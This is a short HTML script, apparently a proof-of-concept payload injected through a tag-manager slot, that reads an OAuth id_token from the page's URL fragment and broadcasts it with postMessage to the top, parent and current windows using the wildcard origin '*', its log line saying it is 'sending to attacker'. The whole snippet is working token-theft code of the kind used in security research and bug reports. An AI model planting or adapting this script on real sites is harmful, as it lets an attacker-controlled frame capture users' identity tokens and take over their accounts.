<script>
    console.log("%c[GTM] Leaky script running", "color:red");

    const state = new URLSearchParams(location.search).get('state') || 'teststate123';

    if (!window.inited) {
        window.inited = true;

        // Auto send token if present in URL
        if (location.hash && location.hash.includes('id_token')) {
            console.log("%c[GTM] Token found in URL, sending to attacker...", "color:lime");
            top.postMessage(location.hash, '*');           // Most important line
            parent.postMessage(location.hash, '*');        // Extra safety
            window.postMessage(location.hash, '*');
        }
    }
</script>
